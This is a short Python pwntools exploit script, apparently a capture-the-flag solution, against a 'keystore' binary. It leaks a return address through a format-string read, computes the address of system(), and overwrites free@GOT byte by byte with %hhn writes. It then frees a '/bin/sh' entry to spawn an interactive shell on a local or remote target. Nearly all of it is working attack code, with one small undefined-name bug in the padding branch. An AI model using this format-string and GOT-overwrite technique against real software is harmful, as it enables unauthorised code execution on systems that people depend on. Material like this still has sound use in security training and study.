# key_store_stack 0xffffcff0
# 0xffffcfb0 arg
# 0xffffd01c main ret
# 0xffffcfc9 # format str payload size = 27
# 0xffffcfe4 # addr to be shoot


from pwn import *

g_local = True
NOT_FOUND_LEN = 13
LEN_PAYLOAD_SIZE = 27
FREE_GOT = 0x0804A3A0
if g_local:
	sh=process("./keystore")
	MAIN_RET_ADDR = 0x18637
	SYSTEM_DISPL = 0x3ada0
else:
	sh=remote("xxx", 1234)
	MAIN_RET_ADDR = 0x19a63
	SYSTEM_DISPL = 0x3e3e0



def find(key):
	sh.send("find " + key + "\n")
	ret = sh.recvuntil(">")
	print ret
	ret = ret[:len(ret)-NOT_FOUND_LEN]
	return ret

def list_keys():
	sh.send("list\n")
	print sh.recvuntil(">")

def add(key, val):
	sh.send("add " + key + ":" + val + "\n")
	print sh.recvuntil(">")

def remove(key):
	sh.send("remove " + key + "\n")
	print sh.recvuntil(">")

def byte_shoot(val, addr):
	if (val <= 8):
		length_payload = A * val
	else:
		length_payload = "%" + str(val) + "x"
	length_payload += "%13$hhn";
	payload_len = len(length_payload)
	assert payload_len <= LEN_PAYLOAD_SIZE
	length_payload += "A" * (LEN_PAYLOAD_SIZE - payload_len)
	print length_payload
	find(length_payload + p32(addr))

sh.recvuntil(">")
system_addr = int(find("%27$x"), 16) - MAIN_RET_ADDR + SYSTEM_DISPL
#leak system addr, 27 is return address of main

byte_shoot(system_addr & 0xff, FREE_GOT)
byte_shoot((system_addr >> 8) & 0xff, FREE_GOT + 1)
byte_shoot((system_addr >> 16) & 0xff, FREE_GOT + 2)
byte_shoot((system_addr >> 24) & 0xff, FREE_GOT + 3)

add("/bin/sh", "111")

sh.send("remove " + "/bin/sh" + "\n")

sh.interactive()